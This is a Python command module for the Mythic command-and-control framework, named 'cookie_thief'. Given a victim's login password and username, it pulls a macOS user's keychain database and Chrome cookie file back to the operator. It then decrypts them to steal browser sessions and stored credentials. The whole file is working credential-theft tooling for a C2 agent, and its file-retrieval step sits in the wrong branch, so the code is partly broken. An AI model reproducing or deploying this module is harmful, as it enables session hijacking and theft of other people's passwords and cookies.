from mythic_payloadtype_container.MythicCommandBase import *
import json
from mythic_payloadtype_container.MythicRPC import *


class CookieThiefArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "password": CommandParameter(
                name="User Login Password",
                type=ParameterType.String,
                description="p@55w0rd_here for user login",
                required=True,
                ui_position=1
            ),
            "browser": CommandParameter(
                name="Browser",
                type=ParameterType.ChooseOne,
                choices=["chrome"],
                required=False,
                description="choose the browser to steal cookies from",
                default_value="chrome",
                ui_position=2
            ),
            "username": CommandParameter(
                name="Username",
                type=ParameterType.String,
                description="Victim's username from whom to steal the cookies",
                required=True,
                ui_position=3
            ),
        }

    async def parse_arguments(self):
        self.load_args_from_json_string(self.command_line)


class CookieThiefCommand(CommandBase):
    cmd = "cookie_thief"
    needs_admin = True
    help_cmd = "cookie_thief {user account password} {browser} {username}"
    description = "Downloads the keychain db and browser cookies, decrypts the keychain, extracts the cookie key and decrypts the cookies."
    version = 1
    #supported_ui_features = ["file_browser:download"] #CHANGE
    author = "@antman"
    parameters = []
    attackmapping = ["T1539", "T1555"]
    argument_class = CookieThiefArguments
    browser_script = BrowserScript(script_name="cookie_thief", author="@antman1p")

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.completed_callback_function = self.downloads_complete
        return task

    async def process_response(self, response: AgentResponse):
        pass

    async def downloads_complete(self, task: MythicTask, subtask: dict = None, subtask_group_name: str = None) -> MythicTask:
        cookiesFileId = " "
        keychainDBFileId = " "
        dlResponses = await MythicRPC().execute("get_responses", task_id=task.id)
        if dlResponses.status == "success":
            dlResponses = dlResponses.response
            for responses in dlResponses["files"]:
                if responses["filename"] == "Cookies":
                    cookiesFileId = responses["agent_file_id"]
            for responses in dlResponses["files"]:
                if responses["filename"] == "login.keychain-db":
                    keychainDBFileId = responses["agent_file_id"]
        else:
            print("Encountered an error attempting to get responses from tasks: " + dlResponses.error)
            sys.stdout.flush()

            getkeychainDBResp = await MythicRPC().execute("get_file", task_id=task.id, agent_file_id=keychainDBFileId)
            if getkeychainDBResp.status == "success":
                getkeychainDBResp = getkeychainDBResp.response[0]
                print(getkeychainDBResp)
            else:
                print("Encountered an error attempting to get downloaded file: " + getkeychainDBResp.error)
                sys.stdout.flush()

        return task
